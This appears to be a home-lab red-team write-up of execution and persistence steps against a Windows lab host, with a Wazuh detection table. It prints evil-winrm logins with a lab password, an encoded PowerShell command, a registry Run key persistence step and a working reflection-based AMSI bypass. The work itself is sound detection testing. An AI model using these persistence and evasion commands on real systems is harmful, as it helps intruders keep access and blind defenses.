# Phase 3: Execution and Persistence

MITRE ATT&CK: T1059.001 T1547.001 T1562.001
Target: win-agent-01 192.168.90.122

## Getting Shell Access: Two Failed Attempts Before Success

The first connection attempt appeared to work momentarily then dropped:

```bash
evil-winrm -i 192.168.90.122 -u john.doe -p 'Winter2024!'
```

```
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\>
```

Then immediately:

```
Error: An error of type WinRM::WinRMAuthorizationError happened
Error: Exiting with code 1
```

The shell opened and closed in the same breath. This was confusing at first because the prompt appeared briefly. The root cause turned out to be that john.doe was not a member of Remote Management Users in either the domain group or the local group on the agent.

Fix on the DC:

```powershell
# Add to the Active Directory group
Add-ADGroupMember -Identity "Remote Management Users" -Members "john.doe"

# Verify the group shows the member
Get-ADGroupMember "Remote Management Users" | Select Name
```

The group membership showed John Doe, but the agent had not picked it up yet because Group Policy had not refreshed. An additional step was needed to add john.doe directly to the local group on win-agent-01:

```powershell
# From the DC, push to the agent via Invoke-Command
Invoke-Command -ComputerName win-agent-01 -ScriptBlock {
  net localgroup "Remote Management Users" "lab\john.doe" /add
  Restart-Service WinRM
}

gpupdate /force
```

Third connection attempt:

```bash
evil-winrm -i 192.168.90.122 -u john.doe -p 'Winter2024!'
```

```
*Evil-WinRM* PS C:\Users\john.doe\Documents>
```

Shell is stable this time.

## Situational Awareness

```powershell
whoami
# lab\john.doe

hostname
# win-agent-01

whoami /groups
# BUILTIN\Remote Management Users
# BUILTIN\Users
# Mandatory Label\Medium Mandatory Level
```

john.doe is a standard domain user running at Medium Mandatory Level. No local administrator rights at this point.

## PowerShell Encoded Command T1059.001

```powershell
powershell -EncodedCommand dwBoAG8AYQBtAGkAIAAvAGEAbABsAA==
```

The base64 decodes to `whoami /all`. It ran successfully and returned the full token with SID and privileges.

## Scheduled Task Persistence T1053.005: Failed Twice

First attempt without specifying a run-as user:

```powershell
schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c whoami > C:\temp\test.txt" /sc onlogon /f
```

```
ERROR: Access is denied.
```

Second attempt explicitly targeting john.doe as the run-as account:

```powershell
schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c whoami" /sc onlogon /ru "lab\john.doe" /f
```

```
ERROR: Access is denied.
```

Both attempts failed. john.doe running in a WinRM remote session at Medium Mandatory Level cannot create scheduled tasks regardless of which account is specified in the run-as parameter. This technique was abandoned. It would become possible later once john.doe was made a local administrator in Phase 5, but it was not revisited.

## Registry Run Key Persistence T1547.001

HKCU does not require administrator rights. This worked immediately:

```powershell
mkdir C:\temp

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "cmd.exe /c whoami" /f
```

```
The operation completed successfully.
```

```powershell
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    Updater    REG_SZ    cmd.exe /c whoami
```

## AMSI Bypass T1562.001

Before attempting this, Defender blocked some commands mid-session with the error "script contains malicious content". The AMSI bypass using reflection resolved that:

```powershell
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

No output means it succeeded. AMSI is disabled for the remainder of this session.

## Disable Windows Defender

This step was performed later on win-agent-02 (after lateral movement in Phase 5) to prepare for the LSASS dump. It is not something that ran on win-agent-01 during Phase 3. Documented in Phase 4.

## Wazuh Detection

| Technique                     | Event             | Status                    | Note                                                      |
|-------------------------------|-------------------|---------------------------|-----------------------------------------------------------|
| WinRM logon                   | 4624 Type 3       | Detected                  | Network logon from 192.168.24.2                           |
| PowerShell encoded            | 4104 Script Block | Not verified              | PowerShell Script Block Logging was not confirmed enabled |
| Scheduled task first attempt  | None              | N/A                       | Access denied before event could be created               |
| Scheduled task second attempt | None              | N/A                       | Same result                                               |
| Registry Run Key              | Sysmon EID 13     | Not verified in dashboard | HKCU CurrentVersion Run write should generate this event  |
| AMSI bypass                   | 4104              | Not verified              | Would appear in script block log if logging was active    |

The registry and AMSI detections were not checked in the Wazuh dashboard during this session. The event data should exist if Sysmon and PowerShell logging are configured, but this was not confirmed.
